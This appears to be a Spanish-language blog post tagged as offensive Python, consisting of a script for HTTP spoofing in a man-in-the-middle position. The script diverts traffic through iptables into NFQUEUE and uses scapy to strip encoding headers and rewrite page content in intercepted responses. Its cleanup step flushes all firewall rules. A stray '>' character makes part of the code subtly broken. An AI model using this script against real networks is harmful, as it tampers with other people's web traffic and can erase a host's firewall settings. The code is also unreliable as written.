---
layout: single
title: HTTP Spoofing - Python
excerpt: "HTTP Spoofing (MITM Attack)."
date: 2025-03-16
classes: wide
header:
  teaser: /img2/images/python.jpg"
  teaser_home_page: true
  icon: /img2/python.ico
categories:
  - Python
  - Scripts
tags:
  - Python Ofensivo
  - MITM
---

```python
import netfilterqueue
import scapy.all as scapy
import re
import sys
import signal
import os
from termcolor import colored


def def_handler(sig,frame):
  print(colored(f"\n[+] Saliendo...\n","red"))
  drequirements()
  sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


def requirements():
  os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
  os.system("iptables --policy FORWARD ACCEPT")


def drequirements():
  os.system("iptables -D INPUT 1")
  os.system("iptables -D INPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0")
  os.system("iptables -F")
  os.system("iptables --policy INPUT ACCEPT")
  os.system("iptables --policy OUTPUT ACCEPT")
  os.system("iptables --policy FORWARD DROP")

def set_load(packet,load): 
  packet[scapy.Raw].load = load 

  del packet[scapy.IP].len
  del packet[scapy.IP].chksum 
  del packet[scapy.TCP].chksum 
  return packet


def process_packet(packet): 
  scapy_packet=scapy.IP(packet.get_payload()) 

  if scapy_packet.haslayer(scapy.Raw): 
    try:
      if scapy_packet[scapy.TCP].dport==80: 
        modified_load= re.sub(b"Accept-Encoding:.*?\\r\\n",b"",scapy_packet[scapy.Raw].load) # >
        new_packet= set_load(scapy_packet,modified_load) 
        packet.set_payload(new_packet.build()) 

      elif scapy_packet[scapy.TCP].sport==80: 
        modified_load= scapy_packet[scapy.Raw].load.replace(b"welcome to our page", b"Hacked") >
        new_packet=set_load(scapy_packet,modified_load) 
        packet.set_payload(new_packet.build()) 

    except:
      pass

  packet.accept()

def main():
  requirements()
  queue=netfilterqueue.NetfilterQueue() 
  queue.bind(0, process_packet) 
  queue.run() 

if __name__=='__main__':
  main()
```

